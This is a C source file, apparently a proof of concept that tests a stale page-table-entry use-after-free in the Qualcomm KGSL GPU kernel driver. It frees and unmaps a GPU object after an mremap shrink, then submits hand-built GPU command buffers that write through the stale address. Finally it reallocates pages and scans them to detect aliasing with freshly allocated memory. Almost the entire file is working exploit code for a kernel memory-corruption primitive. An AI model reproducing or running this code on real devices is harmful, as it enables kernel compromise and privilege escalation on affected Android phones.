/* kgsl-stalelive.c — clean (paired, waited) test of the stale-PTE primitive.
 *
 * 1. double-region E: G1 (mmap#1), G2 (mmap#2 after mremap-shrink)
 * 2. sanity pair -> G2 + marker (both should land)
 * 3. free E, munmap both -> only G2 untracked-unmapped; G1 PTE should persist
 * 4. liveness pair -> G1 + marker : does the IB survive (G1 mapped post-free)?
 * 5. reclaim: alloc F0..Fn (4 KiB), pair -> G1=MAGIC + marker, read each F
 * 6. negative control pair -> G2 + marker (expect fault/unmapped)
 *
 * All GPU writes are emitted as ONE IB [write, write] and the marker is polled
 * before the cmd buffer is reused, eliminating the async-overwrite artifact.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define KGSL_IOC_TYPE 0x09
#define DEV "/dev/kgsl-3d0"
#define USE_CPU_MAP 0x10000000ULL
struct kgsl_gpumem_alloc_id { unsigned int id, flags; size_t size, mmapsize; unsigned long gpuaddr; unsigned long __pad[2]; };
struct kgsl_gpuobj_alloc { uint64_t size, flags, va_len, mmapsize; unsigned int id, metadata_len; uint64_t metadata; };
struct kgsl_gpuobj_info  { uint64_t gpuaddr, flags, size, va_len, va_addr; unsigned int id; };
struct kgsl_drawctxt_create { unsigned int flags, drawctxt_id; };
struct kgsl_drawctxt_destroy { unsigned int drawctxt_id; };
struct kgsl_command_object { uint64_t offset, gpuaddr, size; unsigned int flags, id; };
struct kgsl_gpu_command { uint64_t flags; uint64_t cmdlist; unsigned int cmdsize, numcmds;
    uint64_t objlist; unsigned int objsize, numobjs; uint64_t synclist; unsigned int syncsize, numsyncs, context_id, timestamp; };
#define IOCTL_CTXT_CREATE   _IOWR(KGSL_IOC_TYPE,0x13,struct kgsl_drawctxt_create)
#define IOCTL_CTXT_DESTROY  _IOW (KGSL_IOC_TYPE,0x14,struct kgsl_drawctxt_destroy)
#define IOCTL_PMEM_ALLOC_ID _IOWR(KGSL_IOC_TYPE,0x34,struct kgsl_gpumem_alloc_id)
#define IOCTL_PMEM_FREE_ID  _IOWR(KGSL_IOC_TYPE,0x35,struct kgsl_gpumem_alloc_id)
#define IOCTL_GPUOBJ_ALLOC  _IOWR(KGSL_IOC_TYPE,0x45,struct kgsl_gpuobj_alloc)
#define IOCTL_GPUOBJ_FREE   _IOW (KGSL_IOC_TYPE,0x46,struct kgsl_gpuobj_free)
#define IOCTL_GPUOBJ_INFO   _IOWR(KGSL_IOC_TYPE,0x47,struct kgsl_gpuobj_info)
#define IOCTL_GPU_COMMAND   _IOWR(KGSL_IOC_TYPE,0x4A,struct kgsl_gpu_command)
struct kgsl_gpuobj_free { unsigned int id, flags; uint64_t offset, len; };
#define KGSL_CONTEXT_PREAMBLE 0x10
#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x2
#define KGSL_CMDBATCH_MEMLIST 0x1
#define KGSL_CMDLIST_IB 0x1
#define KGSL_OBJLIST_MEMOBJ 0x8
#define CP_MEM_WRITE 0x3d
#define NF 24

static int fd; static uint32_t *cmd,*mark; static uint64_t cgpu,mgpu; static unsigned cid,ctx;
static void on_alarm(int s){ (void)s; write(1,"[!] alarm\n",10); _exit(0x42); }
static unsigned int parity(unsigned int v){ v^=v>>16; v^=v>>8; v^=v>>4; v&=0xf; return (0x9669u>>v)&1; }
static unsigned int t7(unsigned int op,unsigned int cnt){ cnt&=0x3fff;op&=0x7f; return (7u<<28)|cnt|(parity(cnt)<<15)|(op<<16)|(parity(op)<<23); }
static unsigned int *put_addr(unsigned int *p,uint64_t a){ *p++=(unsigned)a; *p++=(unsigned)(a>>32); return p; }

/* one IB = [write saddr=sval, write mgpu=mval]; wait up to 400ms for marker */
static int submit_pair(uint64_t saddr,uint32_t sval,uint32_t mval,uint32_t *got){
    if(got) *got=0;
    mark[0]=0;
    uint32_t *p=cmd; memset(cmd,0,0x40);
    *p++=t7(CP_MEM_WRITE,3); p=put_addr(p,saddr);  *p++=sval;
    *p++=t7(CP_MEM_WRITE,3); p=put_addr(p,mgpu);   *p++=mval;
    struct kgsl_command_object cob; memset(&cob,0,sizeof cob);
    cob.gpuaddr=cgpu; cob.size=(uint64_t)(p-cmd)*4; cob.flags=KGSL_CMDLIST_IB;
    struct kgsl_command_object mo; memset(&mo,0,sizeof mo);
    mo.gpuaddr=cgpu; mo.size=0x10000; mo.flags=KGSL_OBJLIST_MEMOBJ; mo.id=cid;
    struct kgsl_gpu_command gc; memset(&gc,0,sizeof gc);
    gc.flags=KGSL_CMDBATCH_MEMLIST; gc.context_id=ctx;
    gc.cmdlist=(uint64_t)(uintptr_t)&cob; gc.cmdsize=sizeof cob; gc.numcmds=1;
    gc.objlist=(uint64_t)(uintptr_t)&mo; gc.objsize=sizeof mo; gc.numobjs=1;
    int rc=ioctl(fd,IOCTL_GPU_COMMAND,&gc);
    for(int t=0;t<200;t++){ if(mark[0]==mval) break; usleep(2000); }
    if(got) *got=mark[0];
    return rc;
}
int main(void){
    setvbuf(stdout,NULL,_IONBF,0); signal(SIGALRM,on_alarm); alarm(120);
    printf("== kgsl stale-PTE liveness+reclaim (uid=%d) ==\n",(int)getuid());
    fd=open(DEV,O_RDWR); if(fd<0){ printf("[-] open: %s\n",strerror(errno)); return 1; }
    struct kgsl_gpumem_alloc_id ca; memset(&ca,0,sizeof ca); ca.size=0x10000;
    ioctl(fd,IOCTL_PMEM_ALLOC_ID,&ca); cid=ca.id; cgpu=ca.gpuaddr;
    cmd=mmap(NULL,0x10000,PROT_READ|PROT_WRITE,MAP_SHARED,fd,(off_t)cid<<12); memset(cmd,0,0x10000);
    struct kgsl_gpumem_alloc_id ma; memset(&ma,0,sizeof ma); ma.size=0x1000;
    ioctl(fd,IOCTL_PMEM_ALLOC_ID,&ma); mgpu=ma.gpuaddr;
    mark=mmap(NULL,0x1000,PROT_READ|PROT_WRITE,MAP_SHARED,fd,(off_t)ma.id<<12);
    struct kgsl_drawctxt_create cc; memset(&cc,0,sizeof cc);
    cc.flags=KGSL_CONTEXT_PREAMBLE|KGSL_CONTEXT_NO_GMEM_ALLOC;
    ioctl(fd,IOCTL_CTXT_CREATE,&cc); ctx=cc.drawctxt_id;

    /* double-region E */
    struct kgsl_gpuobj_alloc sa; memset(&sa,0,sizeof sa);
    sa.size=0x2000; sa.flags=USE_CPU_MAP; sa.va_len=0x2000;
    if(ioctl(fd,IOCTL_GPUOBJ_ALLOC,&sa)<0){ printf("[-] svm alloc: %s\n",strerror(errno)); return 1; }
    struct kgsl_gpuobj_info si; memset(&si,0,sizeof si); si.id=sa.id;
    void *v1=mmap(NULL,0x2000,PROT_READ|PROT_WRITE,MAP_SHARED,fd,(off_t)sa.id<<12);
    ioctl(fd,IOCTL_GPUOBJ_INFO,&si); uint64_t G1=si.gpuaddr;
    void *m=mremap(v1,0x2000,0x1000,0); if(m!=MAP_FAILED) v1=m;
    ioctl(fd,IOCTL_GPUOBJ_INFO,&si);
    void *v2=mmap(NULL,0x2000,PROT_READ|PROT_WRITE,MAP_SHARED,fd,(off_t)sa.id<<12);
    ioctl(fd,IOCTL_GPUOBJ_INFO,&si); uint64_t G2=si.gpuaddr;
    printf("[1] E id=%u G1=0x%llx G2=0x%llx v1=%p v2=%p\n",sa.id,
           (unsigned long long)G1,(unsigned long long)G2,v1,v2);

    /* sanity: G2 is the current region */
    { uint32_t got=0; int rc=submit_pair(G2,0x5A5A5A5A,0x00A1,&got);
      printf("[2] sanity G2: rc=%d v2[0]=0x%08x v1[0]=0x%08x mark=0x%08x (want A1)\n",
             rc,((uint32_t*)v2)[0],((uint32_t*)v1)[0],got); }

    /* free E + unmap both vmas */
    { struct kgsl_gpuobj_free f; memset(&f,0,sizeof f); f.id=sa.id; ioctl(fd,IOCTL_GPUOBJ_FREE,&f); }
    munmap(v2,0x2000); munmap(v1,0x1000);
    { struct kgsl_gpuobj_info chk; errno=0; int rr=ioctl(fd,IOCTL_GPUOBJ_INFO,&chk);
      printf("[3] E freed; INFO rc=%d errno=%d (want -1/22 destroyed)\n",rr,errno); }

    /* liveness: G1 mapped post-free? marker must land for the IB to have retired */
    { uint32_t got=0; int rc=submit_pair(G1,0x11111111,0x00B1,&got);
      printf("[4] G1 post-free liveness: rc=%d mark=0x%08x %s\n",rc,got,
             got==0x00B1?"(MAPPED)":"(FAULT/UNMAPPED)"); }

    /* reclaim: allocate NF 4 KiB entries, one pair per alloc, scan */
    static void *fm[NF]; static uint32_t vals[NF];
    int hit=-1;
    for(int i=0;i<NF;i++){
        struct kgsl_gpuobj_alloc fa; memset(&fa,0,sizeof fa);
        fa.size=0x1000; fa.flags=USE_CPU_MAP; fa.va_len=0x1000;
        if(ioctl(fd,IOCTL_GPUOBJ_ALLOC,&fa)<0){ printf("[-] F%d alloc: %s\n",i,strerror(errno)); break; }
        void *p=mmap(NULL,0x1000,PROT_READ|PROT_WRITE,MAP_SHARED,fd,(off_t)fa.id<<12);
        if(p==MAP_FAILED){ printf("[-] F%d mmap: %s\n",i,strerror(errno)); break; }
        fm[i]=p; vals[i]=0x53000000u|i;
        uint32_t got=0; submit_pair(G1,vals[i],0x00D0u|i,&got);
        uint32_t rd=((volatile uint32_t*)p)[0];
        if(rd==vals[i]){ hit=i; }
        printf("    F%-2d id=%-3u va=%p pair mark=0x%08x rd=0x%08x %s\n",
               i,fa.id,p,got,rd,rd==vals[i]?"<<< G1 ALIAS!!":"");
        if(hit>=0) break;
    }
    printf("[6] reclaim scan: %s at index %d\n",hit>=0?"HIT":"no hit",hit);

    /* negative control: G2 should be unmapped */
    { uint32_t got=0; int rc=submit_pair(G2,0x22222222,0x00C1,&got);
      printf("[5] G2 post-free (control): rc=%d mark=0x%08x %s\n",rc,got,
             got==0x00C1?"(still mapped?!?)":"(UNMAPPED as expected)"); }

    { struct kgsl_drawctxt_destroy x={ctx}; ioctl(fd,IOCTL_CTXT_DESTROY,&x); }
    printf("== done ==\n"); return 0;
}
